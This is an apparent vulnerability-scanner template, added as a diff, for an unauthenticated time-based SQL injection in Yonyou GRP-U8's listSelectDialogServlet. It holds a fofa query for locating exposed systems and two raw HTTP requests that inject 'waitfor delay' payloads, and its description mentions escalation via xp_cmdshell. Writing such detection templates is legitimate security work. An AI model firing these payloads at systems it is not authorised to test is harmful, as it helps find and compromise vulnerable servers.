@@ -1,0 +1,30 @@
+id: yongyouU8-GRP-listSelectDialogServlet-sql-time
+
+info:
+  name: "用友GRP-U8 listSelectDialogServlet 接口 SQL 注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="用友-GRP-U8"
+      用友GRP-U8系统listSelectDialogServlet接口存在SQL注入漏洞。攻击者可利用该漏洞执行任意SQL语句，通过调用xpcmdshell扩展存储过程实现文件写入及代码执行，最终导致服务器权限被完全控制。该漏洞无需身份验证即可被远程利用，存在严重的系统安全风险。
+  reference:
+  - https://mp.weixin.qq.com/s/oCZL8e_u2zKMBpOGridZhw
+  tags: 用友U8
+
+
+http:
+- raw:
+  - |
+    GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:4%27 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+  - |
+    GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:8%27 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
